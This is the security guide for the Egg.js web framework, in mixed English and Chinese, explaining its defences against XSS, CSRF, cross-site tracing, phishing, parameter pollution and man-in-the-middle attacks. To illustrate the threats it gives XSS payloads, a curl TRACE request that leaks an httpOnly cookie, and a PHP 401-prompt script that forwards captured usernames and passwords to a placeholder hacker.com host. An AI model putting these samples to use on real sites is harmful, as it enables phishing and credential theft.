title: Security
---

##  Concept of Web Security

There are a lot of security risks in Web applications, the risk will be used by hackers, while distort Web page content, or steal website internal data, further more, malicious code maybe embedded in the Web page, make users be weak. Common security vulnerabilities are as follows:

- XSS attack: inject scripts into Web pages, use JavaScript to steal user information, then induce user actions.
- CSRF attack: forgery user requests to launch malicious requests to the site.
- phishing attacks: use the site's links or images to create phishing traps.
- http parameter pollution: by using imperfect validation of parameter format, the server will be injected with parameters.
- remote code execution: users could implement command through browser, due to the server did not perform function against doing filtering, lead to malicious code execution.

The framework itself has a rich solution for common security risks on the Web side:

- use [extend](https://github.com/eggjs/egg/blob/master/docs/source/zh-cn/basics/extend.md) mechanism to extend Helper API, various template filtering functions are provided to prevent phishing or XSS attacks.
- Support of common Web security headers.
- CSRF defense.
- flexible security configuration that matches different request urls.
- customizable white list for safe redirect and url filtering.
- all kinds of template related tools for preprocessing.

Security plug-ins [egg-security](https://github.com/eggjs/egg-security) are built into the framework, provides default security practices.

### Open or close the configuration

Note: it is not recommended to turn off the functions provided by the security plug-ins unless the consequences are clearly confirmed.

The security plug-in for the framework opens by default, if we want to close some security protection, directly set the ` enable ` attribute to false. For example, close xframe precautions:


```js
exports.security = {
  xframe: {
    enable: false,
  },
};
```

### match and ignore

Match and ignore methods and formats are the same with[middleware general configuration](../basics/middleware.md#match%20and%20ignore).

If you want to set security config open for a certain path, you can configure `match` option.

For example, just open csp when path contains `/example`, you can configure with the following configuration:

```js
exports.security = {
  csp: {
    match: '/example',
    policy: {
      //...
    },
  },
};
```

If you want to set security config disable for a certain path, you can configure match option.

For example, just disable xframe when path contains `/example` while our pages can be embedded in cooperative businesses , you can configure with the following configuration:

```js
exports.security = {
  csp: {
    ignore: '/example',
    xframe: {
      //...
    },
  },
};
```

If you want to close some security protection against internal IP:

```js
exports.security = {
  csrf: {
    // To determine whether to ignore the method, request context "context" as the first parameter
    ignore: ctx => isInnerIp(ctx.ip),
  },
}
```

We'll look at specific scenarios to illustrate how to use the security scenarios provided by the framework for Web security precautions.

## Prevention of security threat ` XSS `

[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))（cross-site scripting）is the most common Web attack, which focus on "cross-domain" and "client-side execution."

XSS attacks generally fall into two categories:

- Reflected XSS
- Stored XSS

### Reflected XSS

Reflective XSS attacks, mainly because the server receives insecure input from the client, triggers the execution of a Web attack on the client side. Such as:

Search for items on a shopping site, and results will display search keywords. Now you fill in the search keywords `<script>alert('handsome boy')</script>`, then click search. If page does not filter the keywords, this code will be executed directly on the page, pop-up alert.

#### Prevention

Framework provides `helper.escape ()` method to do string XSS filter.

```js
const str = '><script>alert("abc") </script><';
console.log(ctx.helper.escape(str));
// => &gt;&lt;script&gt;alert(&quot;abc&quot;) &lt;/script&gt;&lt;
```

When the site need to output the result of user input directly, be sure to use ` helper.escape () ` wrapped. Such as in [egg-view-nunjucks] will overwrite the built-in `escape `

In another case, the output of server's interface will be provided to JavaScript to use. This time you need to use ` helper.SJS () ` for filtering.

`helper.sjs()`  is used to output variables in JavaScript (including events such as onload), and do JavaScript ENCODE for characters in variables.
All characters will be escaped to `\x` if there are not in whitelist, to prevent XSS attacks, also ensure the correctness of the output in JavaScript.

```js
const foo = '"hello"';

// not use sjs
console.log(`var foo = "${foo}";`);
// => var foo = ""hello"";

// use sjs
console.log(`var foo = "${this.helper.sjs(foo)}";`);
// => var foo = "\\x22hello\\x22";
```

There is also a case that sometimes we need to output json in JavaScript, which is easily exploited as a XSS vulnerability if it is not escaped. Framework provides `helper.Sjson()` macro to do json encode, it will traverse the key in a json, all the character in the key's value will be escaped to `\x` if there are not in whitelist, to prevent XSS attacks, while keep the json structure unchanged.
If you need to output a JSON string for use in JavaScript, please use ` helper.Sjson(variable name)` to escape.

** The processing process is more complicated, the performance loss is larger, please use only if necessary **

Example:

```html
  <script>
    window.locals = {{ helper.sjson(locals) }};
  </script>
```

### Stored XSS

Stored XSS attacks are stored on the server by submitting content with malicious scripts that will be launched when others see the content. The content is typically edited through some rich text editors, and it is easy to insert dangerous code.

#### Prevention

Framework provides  `helper.shtml()` to do XSS filtering.

Note that you need to use SHTML to handle the rich text (which contains the text of the HTML code) as a variable directly in the template.
Use SHTML to output HTML tags, while executing XSS filtering, then it can filter out illegal scripts.

** The processing process is more complicated, the performance loss is larger, please use only if you need to output html content **

Example：

```js
// js
const value = `<a href="http://www.domain.com">google</a><script>evilcode…</script>`;

```

```html

// template
<html>
<body>
  {{ helper.shtml(value) }}
</body>
</html>
// => <a href="http://www.domain.com">google</a>&lt;script&gt;evilcode…&lt;/script&gt;

```

Shtml based on [xss](https://github.com/leizongmin/js-xss/) , and add filters by domain name.

- [defaule rule](https://github.com/leizongmin/js-xss/blob/master/lib/default.js)
- [custom rule](http://jsxss.com/zh/options.html)

For example, only support `a` label, and all other properties except `title` are filtered:  `whiteList: {a: ['title']}`

options:

- `config.helper.shtml.domainWhiteList: []` extend whilelist used by "href" and "src"

Note shtml uses a strict whitelisting mechanism, not only filter out the XSS risk strings, all tags or attrs outside [the default rules] (https://github.com/leizongmin/js-xss/blob/master/lib/default.js) will be filtered out.

For example, tag `HTML` is not in the whitelist.

```js
const html = '<html></html>';

// html
{{ helper.shtml(html) }}

// empty output
```

Due to not in the whitelist, common properties like ` data-xx ` will be filtered.

So, it is important to pay attention to the use of shtml, which is generally aimed at the rich text input from users, please avoid abuse, which can be restricted and affect the performance of the service.

Such scenarios are generally like BBS, comment system, etc., even if does not support HTML content such as BBS input, do not use this Helper, direct use ` escape ` instead.

### JSONP XSS

JSONP's "callback" parameter is very dangerous, it has two kinds of risks that might lead to XSS

1. Callback parameter will truncate js code, the special characters like single quotation, double quotation or line breaks, both are at risk.

2、Callback parameter add tag maliciously(such as `<script>`), cause XSS risk.

Refer to [JSONP security technic](http://blog.knownsec.com/2015/03/jsonp_security_technic/)

Within the framework, the [jsonp-body](https://github.com/node-modules/jsonp-body) is used to make jsonp requests safe.

Defense content:

* maximum 50 character limit for the name of callback function
* callback function name only allow `[`, `]`, `a-zA-Z0123456789_`, `$`, `.` to prevent XSS or utf-7 XSS attacks, etc.

Configration:

* callback  default is `_callback`, you can rename
* limit - callback function name length limit, default is 50.

### Other XSS precautions

Browser itself has some protection against all kinds of attacks, they generally take effect by opening the Web security headers. The framework has built-in support for some common Web security headers.

#### CSP

CSP is short for Content Security Policy, It is mainly used to define which resources the page can load and reduce the occurrence of XSS.

The framework supports the CSP configuration, but is closed by default, which can effectively prevent XSS attacks from happening. To configure the CSP, you need to know the policy strategy of CSP first, the details you can refer to [what CSP] (https://www.zhihu.com/question/21979782).

#### X-Download-Options:noopen

Opened by default, introduced in IE8 to control visibility of the "Open" button on the file download dialog.

Refer to http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx

#### X-Content-Type-Options:nosniff

Disable IE8 automatically sniffer such as `text/plain` rendered by `text/HTML` , especially when the content of this site is not credible.

#### X-XSS-Protection

Some XSS detection and precautions provided by Internet explorer, enabled by default

- close default is false，equal to `1; mode=block`

## 安全威胁 CSRF  的防范

[CSRF](https://www.owasp.org/index.php/CSRF)（Cross-site request forgery跨站请求伪造，也被称为 `One Click Attack` 或者 `Session Riding`，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。
CSRF 攻击会对网站发起恶意伪造的请求，严重影响网站的安全。因此框架内置了 CSRF 防范方案。

### 防范方式

通常来说，对于 CSRF 攻击有一些通用的[防范方案](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet#CSRF_Specific_Defense)，简单的介绍几种常用的防范方案：

- Synchronizer Tokens：通过响应页面时将 token 渲染到页面上，在 form 表单提交的时候通过隐藏域提交上来。
- Double Cookie Defense：将 token 设置在 Cookie 中，在提交 post 请求的时候提交 Cookie，并通过 header 或者 body 带上 Cookie 中的 token，服务端进行对比校验。
- Custom Header：信任带有特定的 header（例如 `X-Requested-With: XMLHttpRequest`）的请求。这个方案可以被绕过，所以 rails 和 django 等框架都[放弃了该防范方式](https://www.djangoproject.com/weblog/2011/feb/08/security/)。

框架结合了上述几种防范方式，提供了一个可配置的 CSRF 防范策略。

#### 使用方式

##### 同步表单的 CSRF 校验

在同步渲染页面时，在表单请求中增加一个 name 为 `_csrf` 的 url query，值为 `ctx.csrf`，这样用户在提交这个表单的时候会将 CSRF token 提交上来：

```html
<form method="POST" action="/upload?_csrf={{ ctx.csrf | safe }}" enctype="multipart/form-data">
  title: <input name="title" />
  file: <input name="file" type="file" />
  <button type="submit">upload</button>
</form>
```

传递 CSRF token 的字段可以在配置中改变：

```js
// config/config.default.js
module.exports = {
  security: {
    csrf: {
      queryName: '_csrf', // 通过 query 传递 CSRF token 的默认字段为 _csrf
      bodyName: '_csrf', // 通过 body 传递 CSRF token 的默认字段为 _csrf
    },
  },
};
```

为了防范 [BREACH 攻击](http://breachattack.com/)，通过同步方式渲染到页面上的 CSRF token 在每次请求时都会变化，[egg-view-nunjucks] 等 View 插件会自动对 Form 进行注入，对应用开发者无感知。

##### AJAX 请求

在 CSRF 默认配置下，token 会被设置在 Cookie 中，在 AJAX 请求的时候，可以从 Cookie 中取到 token，放置到 query、body 或者 header 中发送给服务端。

In jQuery:

```js
var csrftoken = Cookies.get('csrfToken');

function csrfSafeMethod(method) {
  // these HTTP methods do not require CSRF protection
  return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
}
$.ajaxSetup({
  beforeSend: function(xhr, settings) {
    if (!csrfSafeMethod(settings.type) && !this.crossDomain) {
      xhr.setRequestHeader('x-csrf-token', csrftoken);
    }
  },
});
```

通过 header 传递 CSRF token 的字段也可以在配置中改变：

```js
// config/config.default.js
module.exports = {
  security: {
    csrf: {
      headerName: 'x-csrf-token', // 通过 header 传递 CSRF token 的默认字段为 x-csrf-token
    },
  },
};
```

#### Session vs Cookie Store

默认配置下，框架会将 CSRF token 存在 Cookie 中，以方便 AJAX 请求获取到。但是所有的子域名都可以设置 Cookie，因此当我们的应用处于无法保证所有的子域名都受控的情况下，存放在 Cookie 中可能有被 CSRF 攻击的风险。框架提供了一个配置项，可以将 token 存放到 Session 中。

```js
// config/config.default.js
module.exports = {
  security: {
    csrf: {
      useSession: true, // default is false，if set to true , it will store csrf token in Session
      cookieName: 'csrfToken', // Cookie 中的字段名，默认为 csrfToken
      sessionName: 'csrfToken', // Session 中的字段名，默认为 csrfToken
    },
  },
};
```

#### Ignore JSON request

Under [SOP](https://en.wikipedia.org/wiki/Same-origin_policy) 的安全策略保护下，基本上所有的现代浏览器都不允许跨域发起 content-type 为 JSON 的请求，因此我们可以直接放过类型的 JSON 格式的请求。

```js
// config/config.default.js
module.exports = {
  security: {
    csrf: {
      ignoreJSON: true, // 默认为 false，当设置为 true 时，将会放过所有 content-type 为 `application/json` 的请求
    },
  },
};
```

#### Refresh CSRF token


As CSRF token is stored in Cookie, once the user switches in the same browser, a new login user will still use the old token (old user used) before, this will bring certain security risks, so everytime user do login, website must refresh  ** CSRF token **.

 ```js
 // login controller
 exports.login = function* (ctx) {
   const { username, password } = ctx.request.body;
   const user = yield ctx.service.user.find({ username, password });
   if (!user) ctx.throw(403);
   ctx.session = { user };

   // call rotateCsrfSecret to refresh CSRF token
   ctx.rotateCsrfSecret();

   ctx.body = { success: true };
 }
 ```

## 安全威胁 XST 的防范

[XST](https://www.owasp.org/index.php/XST) 的全称是 `Cross-Site Tracing`，客户端发 TRACE 请求至服务器，如果服务器按照标准实现了 TRACE 响应，则在 response body 里会返回此次请求的完整头信息。通过这种方式，客户端可以获取某些敏感的头字段，例如 httpOnly 的 Cookie。

下面我们基于 Koa 来实现一个简单的支持 TRACE 方法的服务器：

```javascript
  var koa = require('koa');
  var app = koa();

  app.use(function* (next) {
    this.cookies.set('a', 1, { httpOnly: true });
    if (this.method === 'TRACE') {
      var body = '';
      for (header in this.headers) {
        body += header + ': ' + this.headers[header] + '\r\n';
      }
      this.body = body;
    }
    yield* next;
  });

  app.listen(7001);
```

启动服务后，先发个 GET 请求 `curl -i http://127.0.0.1:7001`，得到如下响应：

```
HTTP/1.1 200 OK
X-Powered-By: koa
Set-Cookie: a=1; path=/; httponly
Content-Type: text/plain; charset=utf-8
Content-Length: 2
Date: Thu, 06 Nov 2014 05:04:42 GMT
Connection: keep-alive

OK
```

服务器设置了一个 httpOnly 的 Cookie 为 1，在浏览器环境中，是无法通过脚本获取它的。

接着我们发 TRACE 请求到服务器`curl -X TRACE -b a=1 -i http://127.0.0.1:7001`，并带上 Cookie，得到如下响应：

```
  HTTP/1.1 200 OK
  X-Powered-By: koa
  Set-Cookie: a=1; path=/; httponly
  Content-Type: text/plain; charset=utf-8
  Content-Length: 73
  Date: Thu, 06 Nov 2014 05:07:47 GMT
  Connection: keep-alive

  user-agent: curl/7.37.1
  host: 127.0.0.1:7001
  accept: */*
  cookie: a=1
```

在响应体里可以看到完整的头信息，这样我们就绕过了 httpOnly 的限制，拿到了cookie=1，造成了很大的风险。

### 拓展阅读

http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html

http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/

### 防范方式

框架已经禁止了 trace，track，options 三种危险类型请求。

## 安全威胁 `钓鱼攻击` 的防范

钓鱼有多种方式，这里介绍 url 钓鱼、图片钓鱼和 iframe 钓鱼。

### url 钓鱼

服务端未对传入的跳转 url 变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。
由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易；
也可能引发的 XSS 漏洞（主要是跳转常常使用 302 跳转，即设置 HTTP 响应头，Locatioin: url，如果 url 包含了 CRLF，则可能隔断了 HTTP 响应头，使得后面部分落到了 HTTP body，从而导致 XSS 漏洞）。

### 防范方式

- If the redirect url can be determined in advance, including the value of the url and parameters, you can configured in the background first. If do redirect, directly preach corresponding index of url, and find corresponding specific url  then redirect through index;
- If the redirect url is not previously determined, but it is generated by server background (not passing by user's parameter), you can make a redirect link, then  sign it;
- if 1 and 2 are not satisfied, url could not determine beforehand and only pass through the front end of the incoming parameters, url must be validated before redirect, to judge whether it within the application authorization whitelist.

框架提供了安全跳转的方法，可以通过配置白名单避免这种风险。

* `ctx.redirect(url)` 如果不在配置的白名单内，则禁止。
* `ctx.unsafeRedirect(url)` 一般不建议使用，明确了解可能带来的风险后使用。

安全方案覆盖了默认的`ctx.redirect`方法，所有的跳转均会经过安全域名的判断。

用户如果使用`ctx.redirect`方法，需要在应用的配置文件中做如下配置：

```js
// config/config.default.js
exports.security = {
  domainWhiteList:['.domain.com'],  // 安全白名单，以 . 开头
};
```

若用户没有配置 `domainWhiteList` 或者 `domainWhiteList`数组内为空，则默认会对所有跳转请求放行，即等同于`ctx.unsafeRedirect(url)`

### 图片钓鱼

如果可以允许用户向网页里插入未经验证的外链图片，这有可能出现钓鱼风险。

比如常见的 `401钓鱼`, 攻击者在访问页面时，页面弹出验证页面让用户输入帐号及密码，当用户输入之后，帐号及密码就存储到了黑客的服务器中。
通常这种情况会出现在`<img src=$url />`中，系统不对`$url`是否在域名白名单内进行校验。

攻击者可以在自己的服务器中构造以下代码：

401.php：作用为弹出 401 窗口，并且记录用户信息。

```php
  <?php
      header('WWW-Authenticate: Basic realm="No authorization"');
      header('HTTP/1.1 401 Unauthorized');
          $domain = "http://hacker.com/fishing/";
          if ($_SERVER[sectech:'PHP_AUTH_USER'] !== null){
                  header("Location: ".$domain."record.php?a=".$_SERVER[sectech:'PHP_AUTH_USER']."&b=".$_SERVER[sectech:'PHP_AUTH_PW']);
          }
  ?>
```

之后攻击者生成一个图片链接`<img src="http://xxx.xxx.xxx/fishing/401.php?a.jpg//" /> `。

当用户访问时，会弹出信息让用户点击，用户输入的用户名及密码会被黑客的服务器偷偷记录。

### 防范方式

框架提供了 `.surl()` 宏做 url 过滤。

用于在 html 标签中中要解析 url 的地方（比如 `<a href=""/><img src=""/>`），其他地方不允许使用。

对模板中要输出的变量，加 `helper.surl($value)`。

**注意：在需要解析 url 的地方，surl 外面一定要加上双引号，否则就会导致XSS漏洞。**

不使用 surl

```html
<a href="$value" />
```

output:

```html
<a href="http://ww.safe.com<script>" />
```

使用 surl

```html
<a href="helper.surl($value)" />
```

output:

```html
<a href="http://ww.safe.com&lt;script&gt;" />
```

### iframe 钓鱼

[iframe 钓鱼](https://www.owasp.org/index.php/Cross_Frame_Scripting)，通过内嵌 iframe 到被攻击的网页中，攻击者可以引导用户去点击 iframe 指向的危险网站，甚至遮盖，影响网站的正常功能，劫持用户的点击操作。

框架提供了 `X-Frame-Options` 这个安全头来防止 iframe 钓鱼。默认值为 SAMEORIGIN，只允许同域把本页面当作 iframe 嵌入。

当需要嵌入一些可信的第三方网页时，可以关闭这个配置。

## 安全威胁 HPP 的防范

Http Parameter Pollution（HPP)，即 HTTP 参数污染攻击。在HTTP协议中是允许同样名称的参数出现多次，而由于应用的实现不规范，攻击者通过传播参数的时候传输 key 相同而 value 不同的参数，从而达到绕过某些防护的后果。

HPP 可能导致的安全威胁有：

- 绕过防护和参数校验。
- 产生逻辑漏洞和报错，影响应用代码执行。

### More

- https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)
- http://blog.csdn.net/eatmilkboy/article/details/6761407
- https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf
- ebay RCE risk：http://secalert.net/2013/12/13/ebay-remote-code-execution/

### How to Protect

框架本身会在客户端传输 key 相同而 value 不同的参数时，强制使用第一个参数，因此不会导致 hpp 攻击。

## [man-in-middle attack](https://www.owasp.org/index.php/Man-in-the-middle_attack)与 HTTP / HTTPS

HTTP is a widely used protocol for Web applications, responsible for Web content requests and acquisitions. Content request will across lots of "middleman", mainly in network link, ACTS as the content of the entrance to the browser, router, WIFI providers, communications operators. if you use a proxy, over the wall software will introduce more "middleman". Because the path and parameters of the HTTP request are explicitly written, these "middleman" can monitor, hijack, and block HTTP requests, it is called man-in-middle attack.

In the absence of HTTPS, ISPs can jump the link directly to an AD when the user initiates a request, or change the search results directly into their own ads. If there is a BUG in the hijacking code, the user will not be able to use the website, the white screen will appear.

Data leakage, request hijacking, content tampering, etc., the core reason is that HTTP is completely naked, and the domain name, path and parameters are clearly visible to the middle people. HTTPS does this by encrypting requests to make them more secure to users. In addition to protecting the interests of users, it can also avoid the traffic being held hostage to protect its own interests.

Although HTTPS is not absolute security, the organization that holds the root certificate and the organization that controls the encryption algorithm can also conduct a man-in-middle attack. But HTTPS is the most secure solution under the current architecture, and it significantly increases the cost of man-in-middle attack.

So, if you use the Egg framework to develop web site developers, please be sure to update your website to HTTPS.

For HTTPS, one should pay attention to is the HTTP transport security (HSTS) strictly, if you don't use HSTS, when a user input url in the browser without HTTPS, the browser will use HTTP access by default.

Framework provides `HSTS Strict-Transport-security`, this header will be opened by default, then let the HTTPS site not redirect to HTTP. If your site supports HTTPS, be sure to open it.If our Web site is an HTTP site, we need to close this header. 

The configuration is as follows:

- maxAge one yeah for default `365 * 24 * 3600`。
- includeSubdomains default is false, you can add subdomain to confirm all subdomains could be accessed by HTTPS.

## 其他安全工具

### ctx.isSafeDomain(domain)

是否为安全域名。安全域名在配置中配置，见 `ctx.redirect` 部分。

### app.injectCsrf(str)

这个函数提供了模板预处理－自动插入 CSRF key 的能力，可以自动在所有的 form 标签中插入 CSRF 隐藏域，用户就不需要手动写了。

### app.injectNonce(str)

这个函数提供了模板预处理－自动插入 nonce 的能力，如果网站开启了 CSP 安全头，并且想使用 ` CSP 2.0 nonce` 特性，可以使用这个函数。参考 [CSP 是什么](https://www.zhihu.com/question/21979782)。

这个函数会扫描模板中的 script 标签，并自动加上 nonce 头。

### app.injectHijackingDefense(str)

对于没有开启 HTTPS 的网站，这个函数可以有限的防止运营商劫持。


[egg-view-nunjucks]: https://github.com/eggjs/egg-view-nunjucks
